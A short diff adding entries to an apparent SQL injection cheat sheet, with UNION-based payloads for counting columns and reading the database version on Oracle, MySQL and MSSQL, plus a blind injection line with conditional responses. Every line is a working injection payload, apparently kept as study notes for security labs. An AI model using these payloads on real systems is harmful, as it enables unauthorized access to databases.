@@ -1,3 +1,21 @@
+#Determining column numbers
+
+' order by 1-- -
+
+' union select null, null from dual-- - >> Oracle
+
+' union select null, null-- - >> Non Oracle
+
+
+
+#To fetch database version
+
+' union select banner, null from v$version-- - >> Oracle
+
+' union select null, @@version-- - Mysql, MSsql
+
+
+
 #Blind SQL injection with conditional responses
 
 ' and (select 'x' from users LIMIT 1)='x'-- -
